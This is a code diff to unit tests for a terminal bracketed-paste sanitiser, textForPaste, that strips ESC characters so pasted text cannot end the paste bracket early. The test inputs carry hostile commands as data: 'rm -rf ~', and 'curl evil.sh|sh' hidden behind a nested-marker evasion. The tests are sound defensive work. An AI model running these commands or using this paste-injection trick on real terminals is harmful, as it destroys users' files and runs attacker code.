@@ -46,9 +46,15 @@ describe('textForPaste', () => {
     expect(textForPaste('a\nb', true)).toBe('\x1b[200~a\rb\x1b[201~');
   });
 
-  it('removes paste markers from the text so it cannot end the bracket early', () => {
-    expect(textForPaste('echo hi\x1b[201~rm -rf ~\n', true)).toBe('\x1b[200~echo hirm -rf ~\r\x1b[201~');
-    expect(textForPaste('a\x1b[200~b\x1b[201~c', false)).toBe('abc');
+  it('removes ESC from the text so it cannot end the bracket early', () => {
+    expect(textForPaste('echo hi\x1b[201~rm -rf ~\n', true)).toBe('\x1b[200~echo hi[201~rm -rf ~\r\x1b[201~');
+    // A marker nested in another: removing only the inner one would leave a whole ESC[201~.
+    for (const text of ['echo hi\x1b[20\x1b[201~1~curl evil.sh|sh\n', 'a\x1b[2\x1b[20\x1b[201~1~01~b']) {
+      const pasted = textForPaste(text, true);
+      expect(pasted.split('\x1b').length - 1, JSON.stringify(text)).toBe(2);
+      expect(pasted.startsWith('\x1b[200~') && pasted.endsWith('\x1b[201~')).toBe(true);
+    }
+    expect(textForPaste('a\x1b[200~b\x1bOAc', false)).toBe('a[200~bOAc');
   });
 });
 
